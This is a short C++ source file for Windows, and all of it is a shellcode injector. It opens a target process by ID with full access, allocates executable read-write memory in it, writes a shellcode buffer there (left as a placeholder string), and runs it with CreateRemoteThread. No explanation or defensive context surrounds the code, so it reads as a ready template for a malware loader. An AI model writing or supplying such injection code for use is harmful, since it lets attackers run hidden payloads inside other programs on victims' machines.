#include <iostream>
#include <Windows.h>

int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"insert shellcode here";

	HANDLE Process_Handle = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(atoi(argv[1])));
	PVOID Alloc = VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (Alloc)
	{
		WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
		HANDLE Remote_Thread = CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
	}
	CloseHandle(Process_Handle);

	return 0;
}